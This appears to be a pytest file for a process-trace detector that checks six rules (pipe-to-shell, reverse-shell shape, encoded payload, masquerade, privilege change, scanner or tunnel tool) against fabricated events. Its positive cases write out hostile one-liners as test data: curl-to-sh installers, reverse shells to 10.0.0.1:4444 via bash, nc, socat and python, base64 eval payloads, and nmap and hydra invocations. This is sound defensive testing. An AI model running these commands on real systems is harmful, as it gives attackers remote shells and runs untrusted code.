"""The six behaviour rules (pipe-to-shell, reverse-shell-shape, encoded-payload, masquerade, privilege-change,
scanner-or-tunnel-tool): what must fire, and the everyday commands that must not. Fabricated events only."""

import pytest
from test_model import T0, S, execev, exitev, make_run, tree_events

from tracewatch.findings_catalog import CATALOG
from tracewatch.model import build

BEHAVIOUR = {"pipe-to-shell", "reverse-shell-shape", "encoded-payload", "masquerade", "privilege-change",
             "scanner-or-tunnel-tool"}  # fmt: skip


def rules_for(tmp_path, argv, exe=None, uid=None, name="x"):
    d = tmp_path / name
    d.mkdir()
    ev = execev(90, 300, 1, T0 + 3 * S, argv, path=exe or ("/usr/bin/" + argv[0].lstrip("-").split("/")[-1]))
    if uid is not None:
        ev["userId"] = uid
    m = build(make_run(d, tree_events() + [ev, exitev(90, 300, 1, T0 + 3.5 * S)]))
    return [f for f in m["findings"] if f["rule"] in BEHAVIOUR], m


def fired(tmp_path, argv, **kw):
    return {f["rule"] for f in rules_for(tmp_path, argv, **kw)[0]}


SH = ["bash", "-c"]


@pytest.mark.parametrize("cmd", [
    "curl -fsSL https://x.example/install.sh | sh",
    "wget -qO- https://x.example/i | sudo bash -s -- --yes",
    "curl -s https://x.example/i | python3 -",
    "bash <(curl -s https://x.example/i)",
    'sh -c "$(curl -fsSL https://x.example/i)"',
])  # fmt: skip
def test_pipe_to_shell_fires(tmp_path, cmd):
    assert "pipe-to-shell" in fired(tmp_path, [*SH, cmd])


@pytest.mark.parametrize("cmd", [
    "curl -s https://x.example/data | python3 -m json.tool",
    "curl -s https://x.example/data | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
    "curl -s https://x.example/data | grep foo", "curl -s https://x.example | jq .", "curl -O https://x.example/f.tgz",
    "curl https://x.example | sh -c 'echo hi'", "echo hello | sh",
])  # fmt: skip
def test_pipe_to_shell_ignores_everyday_commands(tmp_path, cmd):
    assert "pipe-to-shell" not in fired(tmp_path, [*SH, cmd])


@pytest.mark.parametrize("cmd", [
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "nc -e /bin/sh 10.0.0.1 4444", "ncat 10.0.0.1 4444 -c sh",
    "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f",
    "socat tcp-connect:10.0.0.1:4444 exec:/bin/sh",
    "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'",
])  # fmt: skip
def test_reverse_shell_shapes_fire(tmp_path, cmd):
    assert "reverse-shell-shape" in fired(tmp_path, [*SH, cmd])


@pytest.mark.parametrize("cmd", [
    "exec 3<>/dev/tcp/example.com/80", "echo > /dev/tcp/example.com/22", "nc -z example.com 22", "bash -i",
    "python3 -c 'import socket; print(socket.gethostname())'", "ssh user@example.com ls",
])  # fmt: skip
def test_reverse_shell_rule_ignores_connectivity_checks_and_plain_use(tmp_path, cmd):
    assert "reverse-shell-shape" not in fired(tmp_path, [*SH, cmd])


@pytest.mark.parametrize("argv", [
    [*SH, "echo aGVsbG8= | base64 -d | sh"],
    ["php", "-r", 'eval(base64_decode("ZWNobyAxOw=="));'],
    ["python3", "-c", 'exec(__import__("base64").b64decode("cHJpbnQoMSk="))'],
    ["python3", "-c", 'exec(base64.b64decode("cHJpbnQoMSk="))'],
    ["perl", "-MMIME::Base64", "-e", 'eval(decode_base64("cHJpbnQgMQ=="))'],
    ["pwsh", "-enc", "SQBFAFgA"], ["python3", "-c", "A" * 200],
])  # fmt: skip
def test_encoded_payloads_fire(tmp_path, argv):
    assert "encoded-payload" in fired(tmp_path, argv)


@pytest.mark.parametrize("argv", [
    ["base64", "-d", "file.b64"], [*SH, "echo hi | base64"], ["curl", "-H", "Authorization: Basic dXNlcjpwYXNz", "https://x"],
    ["python3", "-c", 'import base64; print(base64.b64decode("aGk="))'], ["python3", "-c", "print(1)"],
])  # fmt: skip
def test_encoded_payload_rule_ignores_plain_base64_use(tmp_path, argv):
    assert "encoded-payload" not in fired(tmp_path, argv)


def test_masquerade_cases(tmp_path):
    hi, _ = rules_for(tmp_path, ["sshd"], exe="/tmp/x/sshd", name="a")
    assert [f["severity"] for f in hi if f["rule"] == "masquerade"] == ["high"]
    assert "masquerade" in fired(tmp_path, ["[kworker/0:2]", "1"], exe="/usr/bin/sleep", name="b")
    assert "masquerade" in fired(tmp_path, ["sshd", "-D"], exe="/home/u/bin/mytool", name="c")


@pytest.mark.parametrize("argv,exe", [
    (["python3", "x.py"], "/home/u/.venv/bin/python"), (["python3.12", "x.py"], "/home/u/.pyenv/bin/python3.12"),
    (["-bash"], "/usr/bin/bash"), (["sh", "-c", "true"], "/usr/bin/dash"), (["sh"], "/home/u/busybox"),
    (["curl", "https://x"], "/usr/bin/curl"),
])  # fmt: skip
def test_masquerade_ignores_venvs_login_shells_and_symlinked_tools(tmp_path, argv, exe):
    assert "masquerade" not in fired(tmp_path, argv, exe=exe)


def test_privilege_change(tmp_path):
    f, _ = rules_for(tmp_path, ["sudo", "-n", "true"], name="a")
    assert [x["severity"] for x in f if x["rule"] == "privilege-change"] == ["low"]  # attempted
    f, _ = rules_for(tmp_path, ["sudo", "-n", "true"], uid=0, name="b")
    assert [x["severity"] for x in f if x["rule"] == "privilege-change"] == ["medium"]  # gained
    assert "privilege-change" in fired(
        tmp_path, ["/opt/helper"], uid=0, exe="/opt/helper", name="c"
    )  # root under non-root
    assert "privilege-change" not in fired(tmp_path, ["ls"], name="d")


@pytest.mark.parametrize("argv", [
    ["nmap", "-sS", "10.0.0.0/24"], ["nc", "-l", "9000"], ["hydra", "-l", "root", "ssh://x"], ["chisel", "client", "x:1"],
    ["ssh", "-R", "8080:localhost:80", "host"], ["ssh", "-D1080", "host"],
])  # fmt: skip
def test_scanner_and_tunnel_tools_fire(tmp_path, argv):
    assert "scanner-or-tunnel-tool" in fired(tmp_path, argv)


@pytest.mark.parametrize(
    "argv", [["ssh", "user@host", "ls"], ["ssh", "-L", "5432:db:5432", "host"], ["ncdu", "/"], ["curl", "https://x"]]
)
def test_scanner_rule_ignores_ordinary_tools(tmp_path, argv):
    assert "scanner-or-tunnel-tool" not in fired(tmp_path, argv)


def test_every_new_rule_is_in_the_catalog_as_synthetic_until_seen_on_a_real_run():
    assert BEHAVIOUR <= set(CATALOG)


def test_credentials_in_a_url_encoded_form_body_over_plain_http_are_flagged(tmp_path):
    """Form bodies keep their redaction tags URL-encoded; the cleartext-credentials rule must still see them."""
    from test_model import proxy_data

    t, f = proxy_data()
    for r in f:
        if r["kind"] == "flow":
            r["scheme"], r["method"] = "http", "POST"
            r["body"] = {"size": 40, "captured": True, "content_type": "application/x-www-form-urlencoded",
                         "text": "password=%5BREDACTED%3Aform%3Aab12cd34%5D"}  # fmt: skip
    d = tmp_path / "f"
    d.mkdir()
    m = build(make_run(d, tree_events() + t, f))
    assert any(x["rule"] == "cleartext-credentials" for x in m["findings"])
